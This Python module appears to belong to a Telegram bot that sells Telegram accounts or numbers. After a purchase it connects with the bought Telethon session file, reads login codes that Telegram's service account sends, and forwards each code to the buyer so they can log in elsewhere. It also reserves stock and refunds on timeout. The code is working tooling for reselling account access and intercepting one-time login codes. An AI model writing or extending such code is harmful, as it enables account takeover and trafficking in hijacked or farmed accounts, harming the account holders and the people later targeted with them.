from __future__ import annotations

import asyncio
import logging
from dataclasses import dataclass
from pathlib import Path

from telethon import TelegramClient, events
from database import Database
from otp_reader import extract_otp

logger = logging.getLogger(__name__)

@dataclass(frozen=True)
class BuyResult:
    ok: bool
    message: str
    item: str | None = None
    price: int | None = None
    stock_id: int | None = None  # Naya field OTP tracking ke liye


class StockManager:
    def __init__(self, db: Database, api_id: int, api_hash: str) -> None:
        self._db = db
        self._api_id = api_id
        self._api_hash = api_hash

    async def buy_item(self, tg_id: int) -> BuyResult:
        result = await self._db.purchase_one_available(tg_id)
        if not result.get("ok"):
            reason = result.get("reason")
            if reason == "out_of_stock":
                return BuyResult(False, "Out of stock. Please try later.")
            if reason == "insufficient_balance":
                return BuyResult(False, f"Insufficient balance. Price: {result.get('price')}")
            if reason == "banned":
                return BuyResult(False, "You are banned.")
            return BuyResult(False, "Please /start first.")

        return BuyResult(
            True, 
            "Purchase successful.", 
            item=str(result["item"]), 
            price=int(result["price"]),
            stock_id=result.get("stock_id")
        )

    async def start_otp_listener(
        self, 
        session_path: Path, 
        user_id: int, 
        stock_id: int, 
        bot_client: TelegramClient
    ) -> None:
        """
        Ye function background mein chalta hai. 
        Ye kharidi gayi session file ko connect karke OTP ka wait karta hai.
        """
        # Session path string hona chahiye Telethon ke liye
        client = TelegramClient(str(session_path), self._api_id, self._api_hash)
        
        try:
            logger.info(f"Starting OTP listener for user {user_id} on session {session_path.name}")
            await client.connect()
            
            if not await client.is_user_authorized():
                await bot_client.send_message(user_id, "⚠️ Error: Allotted session is invalid or expired. Contact support.")
                return

            # Telegram (777000) ke messages ke liye handler
            @client.on(events.NewMessage(from_users=777000))
            async def handler(event):
                otp = extract_otp(event.text)
                if otp:
                    # 1. Database update karo
                    await self._db.finalize_sale(stock_id, otp)
                    
                    # 2. User ko notification bhejo
                    await bot_client.send_message(
                        user_id, 
                        f"📩 **OTP Received for session `{session_path.name}`**\n\n"
                        f"Code: `{otp}`\n\n"
                        f"Ise login panel mein enter karein."
                    )
                    
                    # 3. Kaam khatam, listener stop karo
                    client.remove_event_handler(handler)
                    # Loop ko break karne ke liye hum task cancel kar sakte hain ya return
                    raise asyncio.CancelledError("OTP Found")

            # 5 minute tak wait karega (300 seconds)
            # Agar is beech OTP mil gaya toh CancelledError throw hoga
            await asyncio.wait_for(asyncio.sleep(300), timeout=301)
            
            # Agar bina OTP ke 5 min ho gaye:
            release = await self._db.release_reservation(stock_id, reason="otp_timeout")
            if release.get("ok"):
                await bot_client.send_message(
                    user_id,
                    f"OTP timeout for `{session_path.name}`. No code received in 5 minutes. Number returned to stock and refund issued.",
                )
            else:
                await bot_client.send_message(
                    user_id,
                    f"OTP timeout for `{session_path.name}`. No code received in 5 minutes.",
                )

        except asyncio.CancelledError:
            logger.info(f"OTP found and listener closed for user {user_id}")
        except Exception as e:
            logger.exception(f"Error in OTP listener for {user_id}: {e}")
        finally:
            await client.disconnect()
            logger.info(f"Disconnected session client for user {user_id}")
